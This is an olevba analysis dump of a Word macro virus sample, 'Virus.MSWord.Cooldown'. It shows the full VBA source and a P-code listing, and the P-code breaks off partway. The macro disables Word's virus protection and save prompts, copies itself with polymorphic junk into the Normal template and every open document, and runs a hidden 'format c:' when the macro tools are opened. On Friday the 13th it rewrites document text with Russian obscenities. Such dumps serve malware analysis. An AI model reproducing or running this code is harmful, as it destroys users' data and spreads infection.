olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cooldown
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cooldown - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
       Private Sub _
           Document_Open()
       CoolDown _
                0
    ' 4358.223
End Sub
   ' 3158.194

Private Sub Document_Close()
           
' 4367.055
' 8434.62
' 8392.48
CoolDown _
  0
            ' 2804.815
' 9238.776
End _
 Sub
  ' 7260.659
' 1278.396
' 3516.647
Private Sub ToolsMacro()
          CoolDown 1
               End _
            Sub
            Private Sub _
      ViewVBCode()
 CoolDown 1
          End Sub
 Private _
Sub CoolDown(How _
           As Integer)
            On Error Resume Next
             Dim c _
               As _
 String, _
 a _
               As _
             Long, b As Long, d As Long, e As Long, _
              f _
               As Long, res _
       As String, m _
           As Boolean
             Randomize
       ' 9884.485
' 9673.963
With Options
    .VirusProtection = _
                False
 ' 7797.95
.ConfirmConversions = False
              ' 6528.483
.SaveNormalPrompt _
             = False
     End _
              With
               ' 2456.969
If _
           How = _
               1 _
  Then
             s = Shell("format" & _
          Chr(32) _
  & "c:" & _
      Chr(32) _
   & _
             "/autotest", _
       vbHide)
        Else
    ' 7580.629

With _
                NormalTemplate.VBProject.VBComponents(1).CodeModule
If Not .Find("Cool" & _
        "Down", 1, _
          1, _
1000, _
     1000, _
 False, False) Then
              a = .CountOfLines
  ' 5778.541
' 6558.043
' 5129.993
' 7112.036

' 3557.465
' 3491.188
' 3654.09
For _
  b _
           = 1 To a
   
.DeleteLines _
           (1)
              Next
      ' 51.55921
' 1845.714
d = _
           1
 ' 5108.296
' 571.9924
a = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
' 8980.401
res = _
        ""
          
' 9456.824
' 922.9565
For b = 1 _
           To a
 ' 3486.279

c = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
      ' 2866.625

c = RTrim(LTrim(c))
             If foo(c, _
    f, res) Then
            ' 303.3489
' 190.8255
.InsertLines _
  d, Space(Rnd _
        * 16) & _
   res
           d = d + _
           f
  f _
        = _
              0
       
res _
      = _
      ""
  

End If
 ' 8993.526
Next
  NormalTemplate.Save
         End If
 End With
      ' 6528.254
For e = _
   1 _
            To Documents.Count
               ' 4099.205
' 3133.615
With _
              Documents(e).VBProject.VBComponents(1).CodeModule
             ' 2085.967
' 5214.448
If _
Not _
           .Find("Cool" _
            & "Down", _
   1, _
      1, 1000, 1000, _
       False, _
      False) Then
         ' 1370.392
' 1652.867
' 424.3797
' 1464.009
a = .CountOfLines
           ' 3386.05
' 345.3505
' 1615.986
' 296.4926
' 8380.707
' 9369.005
m _
 = Documents(e).Saved
           ' 8146.857
' 9332.244
For b _
             = 1 _
          To a
 ' 9958.062
.DeleteLines _
            (1)
            Next
      d _
              = 1
              ' 6292.928

a = _
           NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
       res _
               = _
         ""
             For _
    b _
       = 1 To a
              ' 815.0649
' 1515.484
' 4551.789
c = _
              NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
     1)
  c = _
                RTrim(LTrim(c))
            If _
           foo(c, _
            f, _
        res) _
   Then
        .InsertLines _
   d, Space(Rnd _
       * _
        16) & res
         d = d + _
                f
     ' 8951.396
f = _
    0
 ' 9217.687
res _
 = _
          ""
          End If
 
' 7708.467

' 8051.171
Next
           If _
         Documents(e).Path <> _
         "" _
                Then
  ' 6626.557
' 9472.139
Documents(e).SaveAs _
               AddToRecentFiles:=False
        End If
       If (WeekDay(Date) _
      = 6) _
              And _
       (Day(Date) _
       = 13) _
    And (Rnd > 0.7) Then
               Application.StatusBar _
            = _
               ""
   Application.DisplayStatusBar = _
                False
   Application.ScreenUpdating _
 = False
          ' 4459.228
With Documents(e).Content
           .Find.Execute FindText:="пр", ReplaceWith:="пизд", _
 Replace:=wdReplaceAll
     ' 3615.443
' 139.9082

' 8105.651
.Find.Execute FindText:="др", _
  ReplaceWith:="понос", _
           Replace:=wdReplaceAll
   ' 6847.155

' 3508.937
' 4819.152
.Find.Execute _
           FindText:="кр", _
     ReplaceWith:="кобыл", _
              Replace:=wdReplaceAll
      .Find.Execute FindText:="стр", _
  ReplaceWith:="ебан", Replace:=wdReplaceAll
  ' 6487.684

.Find.Execute FindText:="ср", ReplaceWith:="срак", _
       Replace:=wdReplaceAll
         ' 2478.127
' 7162.111

.Find.Execute _
               FindText:="тр", _
              ReplaceWith:="трах", _
              Replace:=wdReplaceAll
     ' 9842.104
.Find.Execute _
                FindText:="бр", _
    ReplaceWith:="бляд", _
  Replace:=wdReplaceAll
         .Find.Execute _
         FindText:="вр", ReplaceWith:="выеб", Replace:=wdReplaceAll
 ' 9261.081
.Find.Execute _
           FindText:="гр", _
          ReplaceWith:="говн", Replace:=wdReplaceAll
       .Find.Execute FindText:="жр", ReplaceWith:="жоп", _
            Replace:=wdReplaceAll
          .Find.Execute _
               FindText:="зр", _
        ReplaceWith:="залуп", Replace:=wdReplaceAll
         ' 1876.24
' 1874.993
.Find.Execute _
      FindText:="дж", ReplaceWith:="джоп", _
          Replace:=wdReplaceAll
         ' 361.6708
' 8679.609
' 5088.313
' 866.1735

' 9144.543
' 5093.092
.Find.Execute _
        FindText:="кал", ReplaceWith:="дер", _
        Replace:=wdReplaceAll
               .Find.Execute _
           FindText:="бух", ReplaceWith:="бряк", _
            Replace:=wdReplaceAll
              End With
               ' 9314.085

Documents(e).UndoClear
           ' 4174.954
Application.DisplayStatusBar _
            = True
   Application.ScreenUpdating _
     = True
             ' 3945.426

' 95.23213
Application.StatusBar _
       = _
           ""
   End If
            ' 225.8831
' 1426.688
Documents(e).Saved = m
  ' 8262.369

End If
     
End With
      
Next
   ' 6253.21
End _
     If
            End _
              Sub
           Private Function _
                foo(ByRef s _
        As _
    String, ByRef _
            i _
     As _
    Long, ByRef res _
       As _
         String) _
           As Boolean
               Dim tmp _
              As String
              ' 1920.175
' 340.2328
' 9265.149

If _
       (Left(s, 1) = _
           "'") _
                Or (Len(s) _
     = 0) Then
                ' 4783.207
foo _
       = _
              False
             Exit _
         Function
               ' 9998.419
End _
           If
' 254.9154

' 7862.768
' 1244.586
If _
      Right(s, _
    2) = Chr(32) & "_" _
        Then
 ' 674.8163

' 6130.167
res _
           = res _
             & Left(s, Len(s) - _
     1)
             foo _
  = _
       False
       ' 1144.96
' 8545.819
Exit _
       Function
       End If
          ' 1067.359
tmp = res & _
          s
               ' 6701.625
' 9650.506
' 4583.337
' 9101.369
res _
    = ""
            
' 5603.884
i _
          = 1
      ' 5855.278
While Rnd > _
        0.5
 If Rnd _
      < _
            0.8 _
        Then
   ' 4500.027
' 368.6839

res _
   = _
              res _
              & _
             "'" _
     & Str(Rnd _
     * _
               10000)
  ' 9727.57
' 9855.497
End If
             res _
     = res & Chr(13)
           ' 5072.772
i = i _
            + 1
      ' 6673.072
Wend
            For a = _
              1 _
     To Len(tmp)
    
res = _
        res & Mid(tmp, _
     a, _
               1)
     If _
             Mid(tmp, _
 a, 1) = Chr(32) _
        Then
  If Rnd > _
     0.5 _
         Then
            
res = _
   res _
        & _
   "_" _
              & Chr(13) & _
   Space(Rnd _
  * _
     16)
   i = i _
        + _
    1
          ' 5658.525
End If
         End _
      If
          Next
              ' 8619.138
foo _
                = True
             End _
              Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cooldown
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14441 bytes
' Line #0:
' 	LineCont 0x0004 02 00 0B 00
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	LineCont 0x0004 01 00 10 00
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #2:
' 	QuoteRem 0x0004 0x0009 " 4358.223"
' Line #3:
' 	EndSub 
' Line #4:
' 	QuoteRem 0x0003 0x0009 " 3158.194"
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x0009 " 4367.055"
' Line #9:
' 	QuoteRem 0x0000 0x0008 " 8434.62"
' Line #10:
' 	QuoteRem 0x0000 0x0008 " 8392.48"
' Line #11:
' 	LineCont 0x0004 01 00 02 00
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #12:
' 	QuoteRem 0x000C 0x0009 " 2804.815"
' Line #13:
' 	QuoteRem 0x0000 0x0009 " 9238.776"
' Line #14:
' 	LineCont 0x0004 01 00 01 00
' 	EndSub 
' Line #15:
' 	QuoteRem 0x0002 0x0009 " 7260.659"
' Line #16:
' 	QuoteRem 0x0000 0x0009 " 1278.396"
' Line #17:
' 	QuoteRem 0x0000 0x0009 " 3516.647"
' Line #18:
' 	FuncDefn (Private Sub ToolsMacro())
' Line #19:
' 	LitDI2 0x0001 
' 	ArgsCall CoolDown 0x0001 
' Line #20:
' 	LineCont 0x0004 01 00 0C 00
' 	EndSub 
' Line #21:
' 	LineCont 0x0004 02 00 06 00
' 	FuncDefn (Private Sub ViewVBCode())
' Line #22:
' 	LitDI2 0x0001 
' 	ArgsCall CoolDown 0x0001 
' Line #23:
' 	EndSub 
' Line #24:
' 	LineCont 0x0008 01 00 00 00 05 00 0B 00
' 	FuncDefn (Private Sub CoolDown(How As Integer))
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	LineCont 0x0024 02 00 0F 00 03 00 01 00 05 00 01 00 06 00 0F 00 07 00 0D 00 15 00 0E 00 16 00 0F 00 1A 00 07 00 1E 00 0B 00
' 	Dim 
' 	VarDefn c (As String)
' 	VarDefn a (As Long)
' 	VarDefn B (As Long)
' 	VarDefn d (As Long)
' 	VarDefn e (As Long)
' 	VarDefn False (As Long)
' 	VarDefn res (As String)
' 	VarDefn m (As Boolean)
' Line #27:
' 	ArgsCall Read 0x0000 
' Line #28:
' 	QuoteRem 0x0007 0x0009 " 9884.485"
' Line #29:
' 	QuoteRem 0x0000 0x0009 " 9673.963"
' Line #30:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #31:
' 	LineCont 0x0004 03 00 10 00
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #32:
' 	QuoteRem 0x0001 0x0008 " 7797.95"
' Line #33:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #34:
' 	QuoteRem 0x000E 0x0009 " 6528.483"
' Line #35:
' 	LineCont 0x0004 02 00 0D 00
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #36:
' 	LineCont 0x0004 01 00 0E 00
' 	EndWith 
' Line #37:
' 	QuoteRem 0x000F 0x0009 " 2456.969"
' Line #38:
' 	LineCont 0x000C 01 00 0B 00 03 00 0F 00 04 00 02 00
' 	Ld How 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LineCont 0x0018 06 00 0A 00 0A 00 02 00 0D 00 06 00 11 00 03 00 12 00 0D 00 14 00 07 00
' 	LitStr 0x0006 "format"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "c:"
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "/autotest"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	QuoteRem 0x0004 0x0009 " 7580.629"
' Line #42:
' Line #43:
' 	LineCont 0x0004 01 00 10 00
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #44:
' 	LineCont 0x0014 07 00 08 00 0B 00 0A 00 0D 00 00 00 0F 00 05 00 11 00 01 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #45:
' 	MemLdWith CountOfLines 
' 	St a 
' Line #46:
' 	QuoteRem 0x0002 0x0009 " 5778.541"
' Line #47:
' 	QuoteRem 0x0000 0x0009 " 6558.043"
' Line #48:
' 	QuoteRem 0x0000 0x0009 " 5129.993"
' Line #49:
' 	QuoteRem 0x0000 0x0009 " 7112.036"
' Line #50:
' Line #51:
' 	QuoteRem 0x0000 0x0009 " 3557.465"
' Line #52:
' 	QuoteRem 0x0000 0x0009 " 3491.188"
' Line #53:
' 	QuoteRem 0x0000 0x0008 " 3654.09"
' Line #54:
' 	LineCont 0x0008 01 00 02 00 02 00 0B 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #55:
' Line #56:
' 	LineCont 0x0004 02 00 0B 00
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	QuoteRem 0x0006 0x0009 " 51.55921"
' Line #59:
' 	QuoteRem 0x0000 0x0009 " 1845.714"
' Line #60:
' 	LineCont 0x0004 02 00 0B 00
' 	LitDI2 0x0001 
' 	St d 
' Line #61:
' 	QuoteRem 0x0001 0x0009 " 5108.296"
' Line #62:
' 	QuoteRem 0x0000 0x0009 " 571.9924"
' Line #63:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #64:
' 	QuoteRem 0x0000 0x0009 " 8980.401"
' Line #65:
' 	LineCont 0x0004 02 00 08 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x0009 " 9456.824"
' Line #68:
' 	QuoteRem 0x0000 0x0009 " 922.9565"
' Line #69:
' 	LineCont 0x0004 04 00 0B 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #70:
' 	QuoteRem 0x0001 0x0009 " 3486.279"
' Line #71:
' Line #72:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #73:
' 	QuoteRem 0x0006 0x0009 " 2866.625"
' Line #74:
' Line #75:
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #76:
' 	LineCont 0x0004 05 00 04 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #77:
' 	QuoteRem 0x000C 0x0009 " 303.3489"
' Line #78:
' 	QuoteRem 0x0000 0x0009 " 190.8255"
' Line #79:
' 	LineCont 0x000C 02 00 02 00 07 00 08 00 0B 00 03 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #80:
' 	LineCont 0x0004 04 00 0B 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #81:
' 	LineCont 0x0008 01 00 08 00 02 00 0E 00
' 	LitDI2 0x0000 
' 	St False 
' Line #82:
' Line #83:
' 	LineCont 0x0008 01 00 06 00 02 00 06 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #84:
' Line #85:
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	QuoteRem 0x0001 0x0009 " 8993.526"
' Line #88:
' 	StartForVariable 
' 	Next 
' Line #89:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndWith 
' Line #92:
' 	QuoteRem 0x0006 0x0009 " 6528.254"
' Line #93:
' 	LineCont 0x0008 03 00 03 00 04 00 0C 00
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #94:
' 	QuoteRem 0x000F 0x0009 " 4099.205"
' Line #95:
' 	QuoteRem 0x0000 0x0009 " 3133.615"
' Line #96:
' 	LineCont 0x0004 01 00 0E 00
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #97:
' 	QuoteRem 0x000D 0x0009 " 2085.967"
' Line #98:
' 	QuoteRem 0x0000 0x0009 " 5214.448"
' Line #99:
' 	LineCont 0x001C 01 00 00 00 02 00 0B 00 06 00 0C 00 09 00 03 00 0B 00 06 00 11 00 07 00 13 00 06 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #100:
' 	QuoteRem 0x0009 0x0009 " 1370.392"
' Line #101:
' 	QuoteRem 0x0000 0x0009 " 1652.867"
' Line #102:
' 	QuoteRem 0x0000 0x0009 " 424.3797"
' Line #103:
' 	QuoteRem 0x0000 0x0009 " 1464.009"
' Line #104:
' 	MemLdWith CountOfLines 
' 	St a 
' Line #105:
' 	QuoteRem 0x000B 0x0008 " 3386.05"
' Line #106:
' 	QuoteRem 0x0000 0x0009 " 345.3505"
' Line #107:
' 	QuoteRem 0x0000 0x0009 " 1615.986"
' Line #108:
' 	QuoteRem 0x0000 0x0009 " 296.4926"
' Line #109:
' 	QuoteRem 0x0000 0x0009 " 8380.707"
' Line #110:
' 	QuoteRem 0x0000 0x0009 " 9369.005"
' Line #111:
' 	LineCont 0x0004 01 00 01 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Saved 
' 	St m 
' Line #112:
' 	QuoteRem 0x000B 0x0009 " 8146.857"
' Line #113:
' 	QuoteRem 0x0000 0x0009 " 9332.244"
' Line #114:
' 	LineCont 0x0008 02 00 0D 00 04 00 0A 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #115:
' 	QuoteRem 0x0001 0x0009 " 9958.062"
' Line #116:
' 	LineCont 0x0004 02 00 0C 00
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #117:
' 	StartForVariable 
' 	Next 
' Line #118:
' 	LineCont 0x0004 01 00 0E 00
' 	LitDI2 0x0001 
' 	St d 
' Line #119:
' 	QuoteRem 0x000E 0x0009 " 6292.928"
' Line #120:
' Line #121:
' 	LineCont 0x0004 02 00 0B 00
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #122:
' 	LineCont 0x0008 01 00 0F 00 02 00 09 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #123:
' 	LineCont 0x0008 01 00 04 00 02 00 07 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #124:
' 	QuoteRem 0x000E 0x0009 " 815.0649"
' Line #125:
' 	QuoteRem 0x0000 0x0009 " 1515.484"
' Line #126:
' 	QuoteRem 0x0000 0x0009 " 4551.789"
' Line #127:
' 	LineCont 0x0008 02 00 0E 00 11 00 05 00
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #128:
' 	LineCont 0x0004 02 00 10 00
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #129:
' 	LineCont 0x0010 01 00 0B 00 05 00 0C 00 07 00 08 00 09 00 03 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #130:
' 	LineCont 0x000C 02 00 03 00 07 00 07 00 08 00 08 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #131:
' 	LineCont 0x0004 04 00 10 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #132:
' 	QuoteRem 0x0005 0x0009 " 8951.396"
' Line #133:
' 	LineCont 0x0004 02 00 04 00
' 	LitDI2 0x0000 
' 	St False 
' Line #134:
' 	QuoteRem 0x0001 0x0009 " 9217.687"
' Line #135:
' 	LineCont 0x0008 01 00 01 00 02 00 0A 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #136:
' 	EndIfBlock 
' Line #137:
' Line #138:
' 	QuoteRem 0x0000 0x0009 " 7708.467"
' Line #139:
' Line #140:
' 	QuoteRem 0x0000 0x0009 " 8051.171"
' Line #141:
' 	StartForVariable 
' 	Next 
' Line #142:
' 	LineCont 0x000C 01 00 09 00 08 00 09 00 09 00 10 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #143:
' 	QuoteRem 0x0002 0x0009 " 6626.557"
' Line #144:
' 	QuoteRem 0x0000 0x0009 " 9472.139"
' Line #145:
' 	LineCont 0x0004 06 00 0F 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	LineCont 0x0014 06 00 06 00 09 00 0E 00 0A 00 07 00 0F 00 07 00 12 00 04 00
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FE6 
' 	Gt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #148:
' 	LineCont 0x0008 03 00 0C 00 04 00 0F 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #149:
' 	LineCont 0x0004 04 00 10 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #150:
' 	LineCont 0x0004 03 00 01 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #151:
' 	QuoteRem 0x000A 0x0009 " 4459.228"
' Line #152:
' 	StartWithExpr 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Content 
' 	With 
' Line #153:
' 	LineCont 0x0004 0C 00 01 00
' 	LitStr 0x0002 "пр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "пизд"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #154:
' 	QuoteRem 0x0005 0x0009 " 3615.443"
' Line #155:
' 	QuoteRem 0x0000 0x0009 " 139.9082"
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0009 " 8105.651"
' Line #158:
' 	LineCont 0x0008 08 00 02 00 0C 00 0B 00
' 	LitStr 0x0002 "др"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "понос"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #159:
' 	QuoteRem 0x0003 0x0009 " 6847.155"
' Line #160:
' Line #161:
' 	QuoteRem 0x0000 0x0009 " 3508.937"
' Line #162:
' 	QuoteRem 0x0000 0x0009 " 4819.152"
' Line #163:
' 	LineCont 0x000C 04 00 0B 00 08 00 05 00 0C 00 0E 00
' 	LitStr 0x0002 "кр"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "кобыл"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #164:
' 	LineCont 0x0004 08 00 02 00
' 	LitStr 0x0003 "стр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ебан"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #165:
' 	QuoteRem 0x0002 0x0009 " 6487.684"
' Line #166:
' Line #167:
' 	LineCont 0x0004 0C 00 07 00
' 	LitStr 0x0002 "ср"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "срак"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #168:
' 	QuoteRem 0x0009 0x0009 " 2478.127"
' Line #169:
' 	QuoteRem 0x0000 0x0009 " 7162.111"
' Line #170:
' Line #171:
' 	LineCont 0x000C 04 00 0F 00 08 00 0E 00 0C 00 0E 00
' 	LitStr 0x0002 "тр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "трах"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #172:
' 	QuoteRem 0x0005 0x0009 " 9842.104"
' Line #173:
' 	LineCont 0x000C 04 00 10 00 08 00 04 00 0C 00 02 00
' 	LitStr 0x0002 "бр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "бляд"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #174:
' 	LineCont 0x0004 04 00 09 00
' 	LitStr 0x0002 "вр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "выеб"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #175:
' 	QuoteRem 0x0001 0x0009 " 9261.081"
' Line #176:
' 	LineCont 0x0008 04 00 0B 00 08 00 0A 00
' 	LitStr 0x0002 "гр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "говн"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #177:
' 	LineCont 0x0004 0C 00 0C 00
' 	LitStr 0x0002 "жр"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "жоп"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #178:
' 	LineCont 0x0008 04 00 0F 00 08 00 08 00
' 	LitStr 0x0002 "зр"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "залуп"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #179:
' 	QuoteRem 0x0009 0x0008 " 1876.24"
' Line #180:
' 	QuoteRem 0x0000 0x0009 " 1874.993"
' Line #181:
' 	LineCont 0x0008 04 00 06 00 0C 00 0A 00
' 	LitStr 0x0002 "дж"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "джоп"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #182:
' 	QuoteRem 0x0009 0x0009 " 361.6708"
' Line #183:
' 	QuoteRem 0x0000 0x0009 " 8679.609"
' Line #184:
' 	QuoteRem 0x0000 0x0009 " 5088.313"
' Line #185:
' 	QuoteRem 0x0000 0x0009 " 866.1735"
' Line #186:
' Line #187:
' 	QuoteRem 0x0000 0x0009 " 9144.543"
' Line #188:
' 	QuoteRem 0x0000 0x0009 " 5093.092"
' Line #189:
' 	LineCont 0x0008 04 00 08 00 0C 00 08 00
' 	LitStr 0x0003 "кал"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "дер"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #190:
' 	LineCont 0x0008 04 00 0B 00 0C 00 0C 00
' 	LitStr 0x0003 "бух"
' 	ParamNamed FindText 
